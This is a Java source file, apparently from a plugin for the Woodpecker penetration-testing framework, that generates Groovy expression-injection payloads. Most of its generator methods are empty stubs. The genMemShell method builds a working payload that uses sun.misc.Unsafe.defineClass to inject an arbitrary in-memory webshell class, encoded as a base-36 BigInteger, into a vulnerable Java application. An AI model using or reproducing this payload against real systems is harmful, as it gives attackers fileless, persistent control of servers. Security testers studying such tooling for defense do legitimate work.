package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.Utils;

public class GroovyExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "Groovy";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[0];
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[0];
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[0];
    }

    @Override
    public String[] genExec(String command) {
        return new String[0];
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[0];
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            MemShellClassFactory classFactory4 = new MemShellClassFactory(memShellClass, MemShellClassFactory.BIGINTEGER);
            return new String[]{
                    out("def ss(a) { a.setAccessible(true);return a};def db(a) { return new java.math.BigInteger(a,36).toByteArray()};ss(sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\")).get(null).defineClass(\"" + classFactory4.getClassName() + "\",db(\"" + classFactory4.getPayload() + "\"),0," + memShellClass.length + ",null,null).newInstance()")
            };
        } catch (Exception e) {
            return new String[]{
                    "class文件异常",
                    Utils.getErrDetail(e)
            };
        }
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[0];
    }

    @Override
    public String[] genLoadJar(String url, String className) {
        return new String[0];
    }
}
